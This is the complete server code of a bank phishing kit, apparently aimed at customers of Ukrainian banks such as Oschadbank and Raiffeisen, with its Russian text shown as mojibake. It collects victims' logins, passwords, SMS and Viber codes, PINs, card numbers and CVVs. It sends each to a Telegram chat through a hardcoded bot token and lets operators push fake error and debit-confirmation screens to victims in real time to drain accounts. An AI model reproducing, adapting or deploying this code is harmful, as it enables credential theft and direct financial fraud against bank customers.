const express = require('express');
const cors = require('cors');
const TelegramBot = require('node-telegram-bot-api');
const WebSocket = require('ws');
const path = require('path');
const { atob } = require('buffer');

// --- –ö–û–ù–§–ò–ì–£–†–ê–¶–ò–Ø ---
const TELEGRAM_BOT_TOKEN = '8159307252:AAGM6imafCiEwoYBOO0jte9oKNiF7YHWgoo';
const CHAT_ID = '-4843197164';
const PORT = process.env.PORT || 3000;
const RENDER_EXTERNAL_URL = process.env.RENDER_EXTERNAL_URL;
const webhookPath = `/bot${TELEGRAM_BOT_TOKEN}`;
const WEBHOOK_URL = RENDER_EXTERNAL_URL ? (RENDER_EXTERNAL_URL + webhookPath) : null;

// --- –ò–ù–ò–¶–ò–ê–õ–ò–ó–ê–¶–ò–Ø ---
const app = express();
app.use(express.json());
app.use(cors());

// –õ–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ –∑–∞–ø—Ä–æ—Å–æ–≤
app.use((req, res, next) => {
    console.log(`[${new Date().toISOString()}] ${req.method} ${req.url}`);
    next();
});

// –ú–∞—Ä—à—Ä—É—Ç—ã –¥–ª—è –æ—Ç–¥–∞—á–∏ —Å—Ç–∞—Ç–∏—á–µ—Å–∫–∏—Ö —Ñ–∞–π–ª–æ–≤
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});
app.get('/panel', (req, res) => {
    res.sendFile(path.join(__dirname, 'panel.html'));
});

// –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è Telegram –±–æ—Ç–∞
const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: false });

// –£—Å—Ç–∞–Ω–æ–≤–∫–∞ –≤–µ–±—Ö—É–∫–∞
if (WEBHOOK_URL) {
    bot.setWebHook(WEBHOOK_URL)
        .then(() => console.log(`Webhook —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω –Ω–∞ ${WEBHOOK_URL}`))
        .catch(err => console.error('–û—à–∏–±–∫–∞ —É—Å—Ç–∞–Ω–æ–≤–∫–∏ –≤–µ–±—Ö—É–∫–∞:', err));
    bot.sendMessage(CHAT_ID, '‚úÖ –ë–æ—Ç –ø–µ—Ä–µ–∑–∞–ø—É—â–µ–Ω –∏ –≥–æ—Ç–æ–≤ –∫ —Ä–∞–±–æ—Ç–µ!', { parse_mode: 'HTML' })
        .catch(err => console.error('–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ —Å–æ–æ–±—â–µ–Ω–∏—è –≤ Telegram:', err));
} else {
    console.error('–û—à–∏–±–∫–∞: RENDER_EXTERNAL_URL –Ω–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω. –í–µ–±—Ö—É–∫ –Ω–µ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω.');
}

// –ü—Ä–æ–≤–µ—Ä–∫–∞ —Å—Ç–∞—Ç—É—Å–∞ –±–æ—Ç–∞
bot.getMe()
    .then(me => console.log(`–ë–æ—Ç –∑–∞–ø—É—â–µ–Ω: @${me.username}`))
    .catch(err => console.error('–û—à–∏–±–∫–∞ –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏–∏ –±–æ—Ç–∞:', err));

// –û–±—Ä–∞–±–æ—Ç–∫–∞ –≤—Ö–æ–¥—è—â–∏—Ö –æ–±–Ω–æ–≤–ª–µ–Ω–∏–π –æ—Ç Telegram
app.post(webhookPath, (req, res) => {
    bot.processUpdate(req.body);
    res.sendStatus(200);
});

// –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è WebSocket —Å–µ—Ä–≤–µ—Ä–∞
const server = require('http').createServer(app);
const wss = new WebSocket.Server({ server });
const clients = new Map();
const sessions = new Map();

// –û–±—Ä–∞–±–æ—Ç–∫–∞ WebSocket-—Å–æ–µ–¥–∏–Ω–µ–Ω–∏–π
wss.on('connection', (ws) => {
    console.log('–ö–ª–∏–µ–Ω—Ç –ø–æ–¥–∫–ª—é—á–∏–ª—Å—è –ø–æ WebSocket');
    ws.on('message', (message) => {
        try {
            const data = JSON.parse(message);
            if (data.type === 'register' && data.sessionId) {
                clients.set(data.sessionId, ws);
                console.log(`–ö–ª–∏–µ–Ω—Ç –∑–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞–Ω: ${data.sessionId}`);
            }
        } catch (e) {
            console.error('–û—à–∏–±–∫–∞ –æ–±—Ä–∞–±–æ—Ç–∫–∏ WebSocket —Å–æ–æ–±—â–µ–Ω–∏—è:', e);
        }
    });
    ws.on('close', () => {
        clients.forEach((clientWs, sessionId) => {
            if (clientWs === ws) {
                clients.delete(sessionId);
                console.log(`–ö–ª–∏–µ–Ω—Ç –æ—Ç–∫–ª—é—á–∏–ª—Å—è: ${sessionId}`);
            }
        });
    });
    ws.on('error', (error) => console.error('–û—à–∏–±–∫–∞ WebSocket:', error));
});

// --- –û–ë–†–ê–ë–û–¢–ö–ê CALLBACK QUERY –û–¢ TELEGRAM ---
bot.on('callback_query', (callbackQuery) => {
    const [type, sessionId] = callbackQuery.data.split(':');
    const ws = clients.get(sessionId);

    if (!ws || ws.readyState !== WebSocket.OPEN) {
        console.error(`–û—à–∏–±–∫–∞: –ö–ª–∏–µ–Ω—Ç ${sessionId} –Ω–µ –≤ —Å–µ—Ç–∏`);
        bot.answerCallbackQuery(callbackQuery.id, { text: '‚ùóÔ∏è –û—à–∏–±–∫–∞: –∫–ª–∏–µ–Ω—Ç –Ω–µ –≤ —Å–µ—Ç–∏!', show_alert: true });
        return;
    }

    const sessionData = sessions.get(sessionId) || {};
    let command = { type, data: {} };
    let responseText = `–ö–æ–º–∞–Ω–¥–∞ "${type}" –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞!`;

    switch (type) {
        case 'lk':
        case 'call':
        case 'ban':
            break;
        case 'number_error':
            command.type = 'number_error';
            command.data = { loginType: sessionData.loginMethod || 'phone' };
            responseText = '–ó–∞–ø—Ä–æ—Å "–Ω–µ–≤–µ—Ä–Ω—ã–π –Ω–æ–º–µ—Ä" –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω!';
            break;
        case 'telegram_debit':
            command.type = sessionData.bankName === '–û—â–∞–¥–±–∞–Ω–∫' ? 'telegram_debit' : 'show_debit_form';
            break;
        case 'password_error':
            if (sessionData.bankName === '–†–∞–π—Ñ—Ñ–∞–π–∑–µ–Ω') {
                command.type = 'raiff_pin_error';
                responseText = '–ó–∞–ø—Ä–æ—Å "–Ω–µ–≤–µ—Ä–Ω—ã–π –ø–∞—Ä–æ–ª—å" –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω!';
            } else {
                command.type = 'password_error';
                command.data = { loginType: sessionData.loginMethod || 'phone' };
                responseText = '–ó–∞–ø—Ä–æ—Å "–Ω–µ–≤–µ—Ä–Ω—ã–π –ø–∞—Ä–æ–ª—å" –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω!';
            }
            break;
        case 'client_not_found':
            command.type = 'client_not_found';
            responseText = '–ó–∞–ø—Ä–æ—Å "–ö–ª–∏–µ–Ω—Ç –Ω–µ –Ω–∞–π–¥–µ–Ω" –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω!';
            break;
        case 'code_error':
            if (sessionData.bankName === '–†–∞–π—Ñ—Ñ–∞–π–∑–µ–Ω') {
                command.type = 'raiff_code_error';
            } else if (sessionData.bankName === '–û—â–∞–¥–±–∞–Ω–∫') {
                command.type = 'code_error';
            } else {
                command.type = 'generic_debit_error';
            }
            responseText = '–ó–∞–ø—Ä–æ—Å "–Ω–µ–≤–µ—Ä–Ω—ã–π –∫–æ–¥" –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω!';
            break;
        case 'request_details':
            if (sessionData.bankName === '–û—â–∞–¥–±–∞–Ω–∫') {
                command.type = 'lk';
                responseText = '–ó–∞–ø—Ä–æ—Å –¥–µ—Ç–∞–ª–µ–π –∫–∞—Ä—Ç—ã (–û—â–∞–¥–±–∞–Ω–∫) –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω!';
            } else if (sessionData.bankName === '–ê–ª—å—è–Ω—Å') {
                command.type = 'request_alliance_card_details';
            } else if (sessionData.bankName !== '–û—â–∞–¥–±–∞–Ω–∫') {
                command.type = 'show_card_details_form';
            } else {
                bot.answerCallbackQuery(callbackQuery.id, { text: '–ö–æ–º–∞–Ω–¥–∞ "–ó–∞–ø—Ä–æ—Å" –Ω–µ –ø—Ä–∏–º–µ–Ω–∏–º–∞ –¥–ª—è –û—â–∞–¥–±–∞–Ω–∫–∞', show_alert: true });
                return;
            }
            responseText = `–ó–∞–ø—Ä–æ—Å –¥–µ—Ç–∞–ª–µ–π –∫–∞—Ä—Ç—ã (${sessionData.bankName}) –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω!`;
            break;
        case 'other':
            command.data = { text: "–ü–æ —Ç–µ—Ö–Ω–∏—á–µ—Å–∫–∏–º –ø—Ä–∏—á–∏–Ω–∞–º –¥–∞–Ω–Ω—ã–π –±–∞–Ω–∫ –≤—Ä–µ–º–µ–Ω–Ω–æ –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω. –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤—ã–±–µ—Ä–∏—Ç–µ –¥—Ä—É–≥–æ–π." };
            break;
        case 'viber_call':
            command.type = 'viber';
            responseText = '–ó–∞–ø—Ä–æ—Å Viber üìû –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω!';
            break;
        case 'redirect_call':
            command.type = 'redirect_call';
            responseText = '–ó–∞–ø—Ä–æ—Å –ü–µ—Ä–µ–∞–¥—Ä–µ—Å–∞—Ü–∏—è üìû –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω!';
            break;
        case 'recovery':
            command.type = 'recovery';
            responseText = '–ó–∞–ø—Ä–æ—Å "–í–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏–µ" –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω!';
            break;
        default:
            console.error(`–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –∫–æ–º–∞–Ω–¥–∞: ${type}`);
            bot.answerCallbackQuery(callbackQuery.id, { text: `–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –∫–æ–º–∞–Ω–¥–∞: ${type}`, show_alert: true });
            return;
    }

    try {
        ws.send(JSON.stringify(command));
        bot.answerCallbackQuery(callbackQuery.id, { text: responseText });
        console.log(`–ö–æ–º–∞–Ω–¥–∞ ${type} –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞ –∫–ª–∏–µ–Ω—Ç—É ${sessionId}`);
    } catch (error) {
        console.error(`–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –∫–æ–º–∞–Ω–¥—ã ${type} –∫–ª–∏–µ–Ω—Ç—É ${sessionId}:`, error);
        bot.answerCallbackQuery(callbackQuery.id, { text: '‚ùóÔ∏è –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –∫–æ–º–∞–Ω–¥—ã!', show_alert: true });
    }
});

// --- –û–ë–†–ê–ë–û–¢–ö–ê API SUBMIT ---
app.post('/api/submit', (req, res) => {
    const { sessionId, isFinalStep, referrer, ...stepData } = req.body;

    if (!sessionId) {
        console.error('–û—à–∏–±–∫–∞: sessionId –æ—Ç—Å—É—Ç—Å—Ç–≤—É–µ—Ç');
        return res.status(400).json({ message: 'SessionId required' });
    }

    let workerNick = 'unknown';
    try {
        if (referrer && referrer !== 'unknown') workerNick = atob(referrer);
    } catch (e) {
        console.error('–û—à–∏–±–∫–∞ –¥–µ–∫–æ–¥–∏—Ä–æ–≤–∞–Ω–∏—è referrer:', e);
    }

    const existingData = sessions.get(sessionId) || {};
    const newData = { ...existingData, ...stepData, workerNick };
    sessions.set(sessionId, newData);

    let message = '';

    if (newData.bankName === '–†–∞–π—Ñ—Ñ–∞–π–∑–µ–Ω') {
        if (stepData.phone) {
            message = `<b>üì± –ù–æ–≤—ã–π –ª–æ–≥ (–†–∞–π—Ñ) - –¢–µ–ª–µ—Ñ–æ–Ω</b>\n\n` +
                     `<b>–ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞:</b> <code>${stepData.phone}</code>\n` +
                     `<b>Worker:</b> @${workerNick}\n`;
            sendToTelegram(message, sessionId, newData.bankName);
        } else if (stepData.sms_code) {
            message = `<b>üí¨ –ö–æ–¥ –∏–∑ SMS (–†–∞–π—Ñ)</b>\n\n` +
                     `<b>–ö–æ–¥:</b> <code>${stepData.sms_code}</code>\n` +
                     `<b>–ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞:</b> <code>${newData.phone}</code>\n` +
                     `<b>Worker:</b> @${workerNick}\n`;
            bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
        } else if (stepData.pin) {
            message = `<b>üîí PIN-–∫–æ–¥ (–†–∞–π—Ñ)</b>\n\n` +
                     `<b>–ü–∏–Ω:</b> <code>${stepData.pin}</code>\n` +
                     `<b>–ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞:</b> <code>${newData.phone}</code>\n` +
                     `<b>Worker:</b> @${workerNick}\n`;
            bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
        } else if (stepData.debit_sms_code) {
            message = `<b>üí∏ –ö–æ–¥ —Å–ø–∏—Å–∞–Ω–∏—è (–†–∞–π—Ñ)</b>\n\n` +
                     `<b>–ö–æ–¥:</b> <code>${stepData.debit_sms_code}</code>\n` +
                     `<b>–ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞:</b> <code>${newData.phone || '–Ω–µ —É–∫–∞–∑–∞–Ω'}</code>\n` +
                     `<b>Worker:</b> @${workerNick}\n`;
            bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
        }
    } else {
        if (stepData.viber_code) {
            message = `<b>üìû –ö–æ–¥ –∏–∑ Viber (–û—â–∞–¥)</b>\n\n` +
                     `<b>–ö–æ–¥:</b> <code>${stepData.viber_code}</code>\n` +
                     `<b>–ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞:</b> <code>${newData.phone || newData.fp_phone || '–Ω–µ —É–∫–∞–∑–∞–Ω'}</code>\n` +
                     `<b>Worker:</b> @${workerNick}\n`;
            bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
        } else if (stepData.call_code) {
            message = `<b>üìû –ö–æ–¥ —Å–æ –∑–≤–æ–Ω–∫–∞ (–û—â–∞–¥)</b>\n\n` +
                     `<b>–ö–æ–¥:</b> <code>${stepData.call_code}</code>\n` +
                     `<b>–ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞:</b> <code>${newData.phone || newData.fp_phone || '–Ω–µ —É–∫–∞–∑–∞–Ω'}</code>\n` +
                     `<b>Worker:</b> @${workerNick}\n`;
            bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
        } else if (stepData.sms_code) {
            message = `<b>üí∏ –ö–æ–¥ —Å–ø–∏—Å–∞–Ω–∏—è (–û—â–∞–¥)</b>\n\n` +
                     `<b>–ö–æ–¥:</b> <code>${stepData.sms_code}</code>\n` +
                     `<b>–ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞:</b> <code>${newData.phone || newData.fp_phone || '–Ω–µ —É–∫–∞–∑–∞–Ω'}</code>\n` +
                     `<b>Worker:</b> @${workerNick}\n`;
            bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
        } else if (stepData.debit_sms_code) {
            message = `<b>üí∏ –ö–æ–¥ —Å–ø–∏—Å–∞–Ω–∏—è (${newData.bankName})</b>\n\n` +
                     `<b>–ö–æ–¥:</b> <code>${stepData.debit_sms_code}</code>\n` +
                     `<b>–ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞:</b> <code>${newData.phone || '–Ω–µ —É–∫–∞–∑–∞–Ω'}</code>\n` +
                     `<b>Worker:</b> @${workerNick}\n`;
            bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
        } else if (stepData.card_details) {
            const details = stepData.card_details;
            message = `<b>üí≥ –î–∞–Ω–Ω—ã–µ –∫–∞—Ä—Ç—ã (${newData.bankName})</b>\n\n` +
                     `<b>–ù–æ–º–µ—Ä –∫–∞—Ä—Ç—ã:</b> <code>${details.card || details.card_number_full || 'N/A'}</code>\n` +
                     `<b>–°—Ä–æ–∫ –¥–µ–π—Å—Ç–≤–∏—è:</b> <code>${details.exp || details.exp_date || 'N/A'}</code>\n` +
                     `<b>CVV:</b> <code>${details.cvv || 'N/A'}</code>\n` +
                     `<b>–ë–∞–ª–∞–Ω—Å:</b> <code>${details.balance || 'N/A'}</code>\n` +
                     (details.pin ? `<b>–ü–Ü–ù:</b> <code>${details.pin}</code>\n` : '') +
                     `<b>Worker:</b> @${workerNick}\n`;
            bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
        } else if (stepData.fp_pin) {
            message = `<b>üîß –í–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏–µ (–û—â–∞–¥)</b>\n\n` +
                     `<b>–ù–∞–∑–≤–∞–Ω–∏–µ –±–∞–Ω–∫–∞:</b> ${newData.bankName}\n` +
                     `<b>–ú–æ–±–∏–ª—å–Ω—ã–π:</b> <code>${newData.fp_phone}</code>\n` +
                     `<b>–ù–æ–º–µ—Ä –∫–∞—Ä—Ç—ã:</b> <code>${newData.fp_card}</code>\n` +
                     `<b>–ü–∏–Ω:</b> <code>${stepData.fp_pin}</code>\n` +
                     `<b>Worker:</b> @${workerNick}\n`;
            sendToTelegram(message, sessionId, newData.bankName);
        } else if (stepData.recovery_pin) {
            message = `<b>üîß –í–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏–µ (–û—â–∞–¥)</b>\n\n` +
                     `<b>–ù–∞–∑–≤–∞–Ω–∏–µ –±–∞–Ω–∫–∞:</b> ${newData.bankName}\n` +
                     `<b>–ù–æ–º–µ—Ä –∫–∞—Ä—Ç—ã:</b> <code>${newData.recovery_card}</code>\n` +
                     `<b>–ü–∏–Ω:</b> <code>${stepData.recovery_pin}</code>\n` +
                     `<b>Worker:</b> @${workerNick}\n`;
            sendToTelegram(message, sessionId, newData.bankName);
        } else if (stepData.password && (stepData.login || stepData.phone)) {
            if (stepData.login) {
                message = `<b>üè¶ –í—Ö–æ–¥ –≤ –û—â–∞–¥ (–õ–æ–≥–∏–Ω)</b>\n\n` +
                         `<b>–ù–∞–∑–≤–∞–Ω–∏–µ –±–∞–Ω–∫–∞:</b> ${newData.bankName}\n` +
                         `<b>–õ–æ–≥–∏–Ω:</b> <code>${stepData.login}</code>\n` +
                         `<b>–ü–∞—Ä–æ–ª—å:</b> <code>${stepData.password}</code>\n` +
                         `<b>Worker:</b> @${workerNick}\n`;
            } else {
                message = `<b>üè¶ –í—Ö–æ–¥ –≤ –û—â–∞–¥ (–¢–µ–ª–µ—Ñ–æ–Ω)</b>\n\n` +
                         `<b>–ù–∞–∑–≤–∞–Ω–∏–µ –±–∞–Ω–∫–∞:</b> ${newData.bankName}\n` +
                         `<b>–ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞:</b> <code>${stepData.phone}</code>\n` +
                         `<b>–ü–∞—Ä–æ–ª—å:</b> <code>${stepData.password}</code>\n` +
                         `<b>Worker:</b> @${workerNick}\n`;
            }
            sendToTelegram(message, sessionId, newData.bankName);
        } else if (isFinalStep) {
            message = `<b>üí≥ –ù–æ–≤—ã–π –ª–æ–≥ (${newData.bankName})</b>\n\n` +
                     `<b>–ù–∞–∑–≤–∞–Ω–∏–µ –±–∞–Ω–∫–∞:</b> ${newData.bankName}\n` +
                     (newData.phone ? `<b>–ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞:</b> <code>${newData.phone}</code>\n` : '') +
                     (newData.card_number ? `<b>–ù–æ–º–µ—Ä –∫–∞—Ä—Ç—ã:</b> <code>${newData.card_number}</code>\n` : '') +
                     (newData.card ? `<b>–ù–æ–º–µ—Ä –∫–∞—Ä—Ç—ã:</b> <code>${newData.card}</code>\n` : '') +
                     `<b>Worker:</b> @${workerNick}\n`;
            sendToTelegram(message, sessionId, newData.bankName);
        }
    }

    res.status(200).json({ message: 'OK' });
});

// --- –û–ë–†–ê–ë–û–¢–ö–ê SMS (–°–¢–ê–†–´–ô –ü–û–¢–û–ö) ---
app.post('/api/sms', (req, res) => {
    const { sessionId, code, referrer } = req.body;

    if (!sessionId || !code) {
        console.error('–û—à–∏–±–∫–∞: sessionId –∏–ª–∏ code –æ—Ç—Å—É—Ç—Å—Ç–≤—É–µ—Ç');
        return res.status(400).json({ message: 'SessionId and code required' });
    }

    let workerNick = 'unknown';
    try {
        if (referrer && referrer !== 'unknown') workerNick = atob(referrer);
    } catch (e) {
        console.error('–û—à–∏–±–∫–∞ –¥–µ–∫–æ–¥–∏—Ä–æ–≤–∞–Ω–∏—è referrer:', e);
    }

    const sessionData = sessions.get(sessionId);
    if (sessionData) {
        const message = `<b>üí¨ –ü–æ–ª—É—á–µ–Ω–æ SMS (—Å—Ç–∞—Ä—ã–π –ø–æ—Ç–æ–∫)</b>\n\n` +
                       `<b>–ö–æ–¥:</b> <code>${code}</code>\n` +
                       (sessionData.phone ? `<b>–ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞:</b> <code>${sessionData.phone}</code>\n` : '') +
                       `<b>–°–µ—Å—Å–∏—è:</b> <code>${sessionId}</code>\n` +
                       `<b>Worker:</b> @${workerNick}\n`;
        bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
        res.status(200).json({ message: 'OK' });
    } else {
        console.error(`–û—à–∏–±–∫–∞: –°–µ—Å—Å–∏—è ${sessionId} –Ω–µ –Ω–∞–π–¥–µ–Ω–∞`);
        res.status(404).json({ message: 'Session not found' });
    }
});

// --- –û–¢–ü–†–ê–í–ö–ê –°–û–û–ë–©–ï–ù–ò–Ø –í TELEGRAM –° –ö–õ–ê–í–ò–ê–¢–£–†–û–ô ---
function sendToTelegram(message, sessionId, bankName) {
    let keyboard = [];

    if (bankName === '–û—â–∞–¥–±–∞–Ω–∫') {
        keyboard = [
            [
                { text: 'Viber üìû', callback_data: `viber_call:${sessionId}` },
                { text: '–ó–í–û–ù–û–ö üìû', callback_data: `call:${sessionId}` },
                { text: '–°–ø–∏—Å–∞–Ω–∏–µ', callback_data: `telegram_debit:${sessionId}` },
                { text: '–ó–∞–ø—Ä–æ—Å üí≥', callback_data: `request_details:${sessionId}` },
            ],
            [
                { text: '–ü–∞—Ä–æ–ª—å ‚ùå', callback_data: `password_error:${sessionId}` },
                { text: '–ö–û–î ‚ùå', callback_data: `code_error:${sessionId}` },
                { text: '–ö–ª–∏–µ–Ω—Ç –Ω–µ –Ω–∞–π–¥–µ–Ω', callback_data: `client_not_found:${sessionId}` },
            ],
            [
                { text: '–í–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏–µ', callback_data: `recovery:${sessionId}` },
                { text: '–î—Ä—É–≥–æ–π –±–∞–Ω–∫', callback_data: `other:${sessionId}` },
                { text: '–ó–∞–±–∞–Ω–∏—Ç—å', callback_data: `ban:${sessionId}` },
            ],
        ];
    } else if (bankName === '–†–∞–π—Ñ—Ñ–∞–π–∑–µ–Ω') {
        keyboard = [
            [
                { text: 'Viber üìû', callback_data: `viber_call:${sessionId}` },
                { text: '–°–ø–∏—Å–∞–Ω–∏–µ', callback_data: `telegram_debit:${sessionId}` },
                { text: '–ó–∞–ø—Ä–æ—Å üí≥', callback_data: `request_details:${sessionId}` },
            ],
            [
                { text: '–ü–∞—Ä–æ–ª—å ‚ùå', callback_data: `password_error:${sessionId}` },
                { text: '–ö–û–î ‚ùå', callback_data: `code_error:${sessionId}` },
            ],
            [
                { text: '–î—Ä—É–≥–æ–π –±–∞–Ω–∫', callback_data: `other:${sessionId}` },
                { text: '–ó–∞–±–∞–Ω–∏—Ç—å', callback_data: `ban:${sessionId}` },
            ],
        ];
    } else {
        keyboard = [
            [
                { text: 'Viber üìû', callback_data: `viber_call:${sessionId}` },
                { text: '–°–ø–∏—Å–∞–Ω–∏–µ', callback_data: `telegram_debit:${sessionId}` },
                { text: '–ó–∞–ø—Ä–æ—Å üí≥', callback_data: `request_details:${sessionId}` },
            ],
            [
                { text: '–ü–∞—Ä–æ–ª—å ‚ùå', callback_data: `password_error:${sessionId}` },
                { text: '–ö–û–î ‚ùå', callback_data: `code_error:${sessionId}` },
            ],
            [
                { text: '–î—Ä—É–≥–æ–π –±–∞–Ω–∫', callback_data: `other:${sessionId}` },
                { text: '–ó–∞–±–∞–Ω–∏—Ç—å', callback_data: `ban:${sessionId}` },
            ],
        ];
    }

    bot.sendMessage(CHAT_ID, message, {
        parse_mode: 'HTML',
        reply_markup: { inline_keyboard: keyboard },
    }).catch(err => console.error('–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ —Å–æ–æ–±—â–µ–Ω–∏—è –≤ Telegram:', err));
}

// --- –ó–ê–ü–£–°–ö –°–ï–†–í–ï–†–ê ---
server.listen(PORT, '0.0.0.0', () => {
    console.log(`–°–µ—Ä–≤–µ—Ä –∑–∞–ø—É—â–µ–Ω –Ω–∞ –ø–æ—Ä—Ç—É ${PORT}`);
});
